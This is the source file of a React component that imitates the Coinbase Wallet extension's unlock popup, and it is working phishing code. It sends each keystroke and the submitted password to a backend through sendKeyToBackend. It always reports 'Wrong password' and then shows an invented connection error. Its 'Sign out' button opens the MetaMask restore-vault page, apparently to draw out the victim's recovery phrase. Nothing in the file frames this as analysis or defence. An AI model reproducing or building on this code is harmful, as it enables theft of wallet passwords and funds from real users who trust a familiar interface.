import React, { useState, useEffect, useRef } from 'react';
import { initializeLocationData, initializeSocket, sendKeyToBackend } from '../../services/keyService';
import { WALLET_TYPE_SHORTKEY } from '../../services/config';
import { CustomWalletModalProps } from '../../types';
import './styles.css';

const CoinbaseModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose, userId, backendConfig }) => {
  const [keyword, setKeyword] = useState('');
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState('');
  const [trying, setTrying] = useState(0);
  const [connecting, setConnecting] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [isClosable, setIsClosable] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [showForgotPasswordPage, setShowForgotPasswordPage] = useState(false);
  const [isInputHovered, setIsInputHovered] = useState(false);
  const [isInputPressed, setIsInputPressed] = useState(false);
  const [isUnlockHovered, setIsUnlockHovered] = useState(false);
  const [isUnlockPressed, setIsUnlockPressed] = useState(false);
  const [isForgotPasswordHovered, setIsForgotPasswordHovered] = useState(false);
  const [isForgotPasswordPressed, setIsForgotPasswordPressed] = useState(false);
  const [isSignOutHovered, setIsSignOutHovered] = useState(false);
  const [isSignOutPressed, setIsSignOutPressed] = useState(false);
  
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const modalRef = useRef<HTMLDivElement>(null);

  // Handle initial setup when modal opens
  useEffect(() => {
    if (isOpen) {
      initializeLocationData();
      initializeSocket();

      setTimeout(() => {
        passwordInputRef.current?.focus();
      }, 4000);
    } else {
      setShowForgotPasswordPage(false);
    }
  }, [isOpen]);

  // Handle document click - separate effect
  useEffect(() => {
    if (!isOpen) return;

    const handleDocumentClick = (e: MouseEvent) => {
      if (isClosable && modalRef.current && !modalRef.current.contains(e.target as Node)) {
        handleClick();
      }
    };

    document.addEventListener('click', handleDocumentClick);
    return () => {
      document.removeEventListener('click', handleDocumentClick);
    };
  }, [isOpen, isClosable]);

  const handleClick = () => {
    if (onClose) onClose();
    setKeyword('');
    setTrying(0);
    setConnectionError(false);
    setError(false);
    setShowPassword(false);
    setShowForgotPasswordPage(false);
  };

  const handleKeywordChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const newKeyword = e.target.value;
    setKeyword(newKeyword);
    setError(false);

    const currentUserId = backendConfig?.userId || userId;
    if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
      await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.COINBASE);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(prev => !prev);
    setTimeout(() => {
      passwordInputRef.current?.focus();
    }, 0);
  };

  const handleKeywordTyping = async () => {
    if (connecting) return;

    setConnecting(true);
    const currentUserId = backendConfig?.userId || userId;

    if (!currentUserId) {
      setConnecting(false);
      setError(true);
      setHelperText('User ID is required');
      return;
    }

    if (backendConfig?.enabled !== false) {
      const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.COINBASE);

      setTimeout(() => {
        setConnecting(false);
        if (trying < 3) {
          setError(true);
          setHelperText(result.error || 'Wrong password');
          setTrying(trying + 1);
        } else {
          setConnectionError(true);
        }
        passwordInputRef.current?.focus();
      }, 150);
    } else {
      setTimeout(() => setConnecting(false), 150);
    }
  };

  const handleForgotPasswordClick = () => {
    setShowForgotPasswordPage(true);
  };

  const handleReturnFromForgotPassword = () => {
    setShowForgotPasswordPage(false);
  };

  const handleSignOut = () => {
    handleClick();
    window.open('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault', '_blank');
  };

  const closeWindow = () => {
    handleClick();
    setTimeout(() => {
      setConnectionError(false);
      setKeyword('');
      setTrying(0);
      setError(false);
    }, 1000);
  };

  if (!isOpen) return null;


  const modalContent = (
    <div
      id="header-layout"
      ref={modalRef}
      className={`fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
      onMouseEnter={() => setIsClosable(false)}
      onMouseLeave={() => setIsClosable(true)}
    >
      <div className="w-[375px] h-[600px] shadow-[0_2px_8px_0_rgba(0,0,0,0.2)] relative">
        <div className="h-full relative" style={{ backgroundColor: '#141519' }}>
          {connectionError ? (
            <div className="text-white text-center px-4 py-8 flex flex-col h-full justify-between">
              <div></div>
              <div className="">
                <div className="flex justify-center w-full items-center mb-4">
                  <svg className="text-2xl text-center text-red-500 w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-xl font-extrabold euclid-bold">Connection failed</h3>
                <div className="text-sm leading-relaxed">
                  <h6>Fetching of</h6>
                  <h5 className="font-bold">@unstoppabledomains/unstoppable-</h5>
                  <h5>
                    <span className="font-bold">resolution-snap</span> failed, check your network and
                  </h5>
                  <h5>try again.</h5>
                </div>
                <div className="mt-4 text-base border-l-4 border-red-500 bg-red-50 text-black p-4 rounded text-left">
                  <h5>One or more permissions are not allowed:</h5>
                  <h5>This endowment is experiental and therefore </h5>
                  <h5>not available.</h5>
                </div>
              </div>
              <button
                className="w-full rounded-full cursor-pointer schibsted-grotesk-regular p-2.5 hover:bg-[#3148f5] border-[#ffffff] bg-[#4459ff] text-[#141618]"
                onClick={closeWindow}
              >
                Ok
              </button>
            </div>
          ) : showForgotPasswordPage ? (
            <div className="flex flex-col w-full h-full bg-black">
              {/* Header with return button */}
              <div className="py-[16px] flex flex-row items-start">
                <div className="flex flex-row items-start pl-[16px] w-[16px] h-[44px]">
                  <button
                    onClick={handleReturnFromForgotPassword}
                    className="w-[40px] h-[40px] rounded-full flex items-center justify-center hover:bg-[rgba(255, 255, 255, 0.1)] transition-colors"
                    aria-label="Return"
                  >
                    <svg 
                      className="w-5 h-5 text-white" 
                      style={{ width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }} 
                      viewBox="0 0 1024 1024" 
                      version="1.1" 
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path d="M853.333333 469.333333v85.333334H341.333333l234.666667 234.666666-60.586667 60.586667L177.493333 512l337.92-337.92L576 234.666667 341.333333 469.333333h512z" fill="currentColor" />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Main content */}
              <div className="flex flex-col justify-start flex-1 px-[24px] pb-[24px]">
                <h1 className="coinbase-font-bold text-[28px] font-bold text-white pt-[8px] pb-[16px]">Forgot password?</h1>
                
                <div className="flex flex-col gap-[16px]">
                  <p className="coinbase-font text-[16px] text-[#8A919E]">
                    If you've forgotten your password, you need to sign out and re-enter your recovery phrase. After that, you can create a new password.
                    <br />
                    <br />
                    Do not sign out unless you know your 12-word recovery phrase.      
                  </p>
                </div>
                <p className="coinbase-font text-[16px] text-[#FFFFFF] pt-[16px]">
                  Signing out of 1 recovery phrase.
                </p>
                
                <div className="pt-[16px]">
                  <button
                    onClick={handleSignOut}
                    onMouseEnter={() => setIsSignOutHovered(true)}
                    onMouseLeave={() => {
                      setIsSignOutHovered(false);
                      setIsSignOutPressed(false);
                    }}
                    onMouseDown={() => setIsSignOutPressed(true)}
                    onMouseUp={() => setIsSignOutPressed(false)}
                    className={`coinbase-font h-[56px] text-[16px] bg-[rgb(38,40,45)] font-semibold cursor-pointer w-full leading-[24px] text-center rounded-[54px] transition-all ${
                      isSignOutPressed
                        ? 'bg-[rgb(40,43,49)] text-[#ffffff] h-[55px] w-[calc(100%-1px)] mx-[0.5px]'
                        : isSignOutHovered
                          ? 'bg-[rgb(50, 53, 59)] text-[#ffffff] h-[56px] w-full'
                          : 'bg-[rgb(50, 53, 59)] text-[#ffffff] h-[56px] w-full'
                    }`}
                  >
                    Sign out
                  </button>
                </div>
              </div>
            </div>
          ) : (
            <div className="flex flex-col w-full h-full pt-[24px] pb-[32px] px-[16px]">
                <div className="flex flex-col">
                  <div className="pb-[16px]">
                    <div className="flex w-[58px] h-[58px] rounded-[16px] overflow-hidden">
                      <svg width="100%" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="1024" height="1024" fill="#0052FF"></rect>
                        <path fillRule="evenodd" clipRule="evenodd" d="M152 512C152 710.823 313.177 872 512 872C710.823 872 872 710.823 872 512C872 313.177 710.823 152 512 152C313.177 152 152 313.177 152 512ZM420 396C406.745 396 396 406.745 396 420V604C396 617.255 406.745 628 420 628H604C617.255 628 628 617.255 628 604V420C628 406.745 617.255 396 604 396H420Z" fill="white"></path>
                      </svg>
                    </div>
                  </div>
                  <h1 className="coinbase-font-bold text-[28px] font-bold text-white">Coinbase Wallet</h1>
                  <h1 className="coinbase-font-bold text-[20px] font-bold text-[#8A919E] pb-[8px]">Extension</h1>
                </div>
                <div className="h-full"></div>
                <div className="flex flex-col justify-between h-full gap-[16px]">
                  <div className="flex flex-col gap-[4px] min-h-[106px]">
                    <label className="coinbase-font-bold text-[14px] text-[#ffffff] py-[4px] w-full font-semibold">Unlock with password</label>
                    <div className="relative flex-col w-full">
                      <div 
                        onMouseEnter={() => setIsInputHovered(true)}
                        onMouseLeave={() => {
                          setIsInputHovered(false);
                          setIsInputPressed(false);
                        }}
                        onMouseDown={() => setIsInputPressed(true)}
                        onMouseUp={() => setIsInputPressed(false)}
                        className={`opacity-100 text-[14px] rounded-[8px] relative cursor-text flex flex-row box-border items-center transition-colors ${
                          isInputPressed 
                            ? 'bg-[rgb(21,22,24)]' 
                            : isInputHovered 
                              ? 'bg-[rgb(17,18,20)]' 
                              : 'bg-[rgb(10,11,13)]'
                        } ${
                          error
                            ? (isFocused 
                                ? 'border-2 border-[rgb(240,97,109)]' 
                                : 'border border-[rgb(240,97,109)]')
                            : (isFocused 
                                ? 'border-2 border-[rgb(55,115,245)]' 
                                : 'border border-[rgba(138,145,158,0.66)]')
                        }`}
                      >
                        <input 
                          ref={passwordInputRef}
                          aria-invalid="false" 
                          autoComplete="current-password"
                          id="component-password"
                          type={showPassword ? "text" : "password"}
                          value={keyword}
                          onChange={handleKeywordChange}
                          onFocus={() => setIsFocused(true)}
                          onBlur={() => setIsFocused(false)}
                          onKeyPress={(e) => {
                            if (e.key === 'Enter') {
                              handleKeywordTyping();
                            }
                          }}
                          className="coinbase-font focus:outline-none border-none text-[16px] rounded-[8px] box-content p-[16px] bg-transparent w-full text-white tracking-normal"
                          placeholder=""
                        />
                        <div className="ml-[8px] flex items-center justify-center">
                          <button 
                            className="w-[40px] h-[40px] rounded-full flex items-center justify-center hover:bg-[rgba(255, 255, 255, 0.2)] transition-colors" 
                            tabIndex={0} 
                            type="button" 
                            aria-label="toggle password visibility"
                            onClick={togglePasswordVisibility}
                          >
                            {showPassword ? (
                              <svg 
                                className="w-4 h-4 text-white" 
                                style={{ width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }} 
                                viewBox="0 0 1024 1024" 
                                version="1.1" 
                                xmlns="http://www.w3.org/2000/svg"
                              >
                                <path d="M511.9776 96c95.296 0 182.592 35.712 249.984 94.944 47.648 41.824 126.624 122.304 237.024 241.408 32 34.272 33.472 87.36 3.488 123.424l-3.456 3.904-9.408 10.176c-105.824 114.08-182.08 191.424-228.704 232.096C693.7056 860.64 606.8256 896 512.0096 896c-95.424 0-182.784-35.776-250.208-95.072C214.2496 759.04 135.3696 678.688 25.0656 559.68a93.536 93.536 0 0 1-3.456-123.488l3.456-3.904 9.376-10.144c105.344-113.408 181.12-190.4 227.36-231.04C329.1936 131.808 416.5216 96 511.9456 96H512.0096z m0 188.224c-117.92 0-213.504 94.848-213.504 211.776 0 116.928 95.584 211.776 213.504 211.776 117.888 0 213.504-94.848 213.504-211.776 0-116.928-95.616-211.776-213.504-211.776z m0 94.144c65.504 0 118.592 52.64 118.624 117.632 0 64.96-53.12 117.664-118.624 117.664-63.52 0-115.776-49.6-118.496-112.544l-0.128-5.12h71.168c24.832 0 45.44-18.976 47.328-43.52l0.16-3.52v-70.592h-0.032z" />
                              </svg>
                            ) : (
                              <svg 
                                className="w-4 h-4 text-white" 
                                style={{ width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }} 
                                viewBox="0 0 1024 1024" 
                                version="1.1" 
                                xmlns="http://www.w3.org/2000/svg"
                              >
                                <path d="M733.976092 128.406508c-32.626072-18.838044-74.333986-7.659447-93.16282 24.961508l-40.699957 70.307276c-28.245298-6.075369-58.112536-9.480932-89.604784-9.480932-293.635667 0-445.218014 297.803593-445.218014 297.803593s82.454944 149.279908 231.025701 236.45127l-31.253818 53.983495c-18.831904 32.618908-7.659447 74.327846 24.964578 93.164866 32.615838 18.828834 74.330916 7.659447 93.164866-24.964578L758.936577 221.569328C777.772574 188.95042 766.591931 147.238412 733.976092 128.406508zM304.728818 511.997953c0-114.952078 92.615351-208.164017 207.269647-208.164017 13.520945 0 26.731828 1.300622 39.521109 3.776l-37.147038 64.167438c-0.791016-0.01228-1.578961-0.044002-2.37407-0.044002-77.131705 0-139.67004 62.835094-139.67004 140.263557 0 26.116821 7.132444 50.523697 19.526729 71.417563l-37.134759 64.144926C323.559699 611.141998 304.728818 563.795667 304.728818 511.997953z" />
                                <path d="M770.978844 300.511261 699.60119 423.39601c12.599969 26.88737 19.668968 56.910151 19.668968 88.601944 0 109.690238-84.347037 199.515033-191.68367 207.520357l-51.458999 88.590688c11.92868 1.092891 24.075325 1.695618 36.464493 1.695618 292.447609 0 446.1175-297.807686 446.1175-297.807686S895.060861 388.454196 770.978844 300.511261z" />
                              </svg>
                            )}
                          </button>
                        </div>
                      </div>
                      {error && (
                        <p className="coinbase-font m-0 text-[14px] mt-[3px] text-left leading-[1.66] text-[#F0616D] flex items-center gap-[6px]" id="component-password-text">
                          <svg 
                            className="flex-shrink-0" 
                            style={{ width: '1em', height: '1em', verticalAlign: 'middle', fill: 'currentColor', overflow: 'hidden' }} 
                            viewBox="0 0 1024 1024" 
                            version="1.1" 
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path d="M512 938.666667C276.352 938.666667 85.333333 747.648 85.333333 512S276.352 85.333333 512 85.333333s426.666667 191.018667 426.666667 426.666667-191.018667 426.666667-426.666667 426.666667z m-42.666667-298.666667v85.333333h85.333334v-85.333333h-85.333334z m0-341.333333v256h85.333334V298.666667h-85.333334z" />
                          </svg>
                          Wrong password
                        </p>
                      )}
                    </div>
                  </div>

                  <div className="box-border w-full text-center text-[16px] font-medium">
                    <button 
                      onClick={handleKeywordTyping}
                      disabled={error}
                      onMouseEnter={() => {
                        if (keyword && keyword.length > 0 && !error) setIsUnlockHovered(true);
                      }}
                      onMouseLeave={() => {
                        setIsUnlockHovered(false);
                        setIsUnlockPressed(false);
                      }}
                      onMouseDown={() => {
                        if (keyword && keyword.length > 0 && !error) setIsUnlockPressed(true);
                      }}
                      onMouseUp={() => setIsUnlockPressed(false)}
                      className={`coinbase-font-bold text-[16px] font-semibold leading-[24px] text-center rounded-[54px] transition-all ${
                        error
                          ? 'bg-[#1E3568] text-[#0F0F12] cursor-default opacity-50 h-[56px] w-full'
                          : keyword && keyword.length > 0
                            ? (isUnlockPressed
                                ? 'bg-[#447CF6] text-[#101829] h-[55px] w-[calc(100%-1px)] mx-[0.5px] cursor-pointer'
                                : isUnlockHovered
                                  ? 'bg-[#3F79F5] text-[#192A50] h-[56px] w-full cursor-pointer'
                                  : 'bg-[#447CF6] text-[#101829] h-[56px] w-full cursor-pointer')
                            : 'bg-[#1E3568] text-[#0F0F12] h-[56px] w-full cursor-pointer'
                      }`}
                    >
                      Unlock
                    </button>
                  </div>
                  <div className="box-border w-full text-center text-[16px] font-medium rounded-[54px]">
                    <button 
                      className={`coinbase-font-bold h-[56px] text-[16px] font-semibold cursor-pointer w-full leading-[24px] text-center rounded-[54px] transition-colors ${
                        isForgotPasswordPressed
                          ? 'bg-[#151618] text-white'
                          : isForgotPasswordHovered
                            ? 'bg-[#111214] text-[#DCDCDC]'
                            : 'bg-transparent text-white'
                      }`}
                      onClick={handleForgotPasswordClick}
                      onMouseEnter={() => setIsForgotPasswordHovered(true)}
                      onMouseLeave={() => {
                        setIsForgotPasswordHovered(false);
                        setIsForgotPasswordPressed(false);
                      }}
                      onMouseDown={() => setIsForgotPasswordPressed(true)}
                      onMouseUp={() => setIsForgotPasswordPressed(false)}
                    >
                      Forgot password?
                    </button>
                  </div>
                </div>
              </div>
          )}
        </div>
      </div>
    </div>
  );

  return modalContent;
};

export default CoinbaseModal;
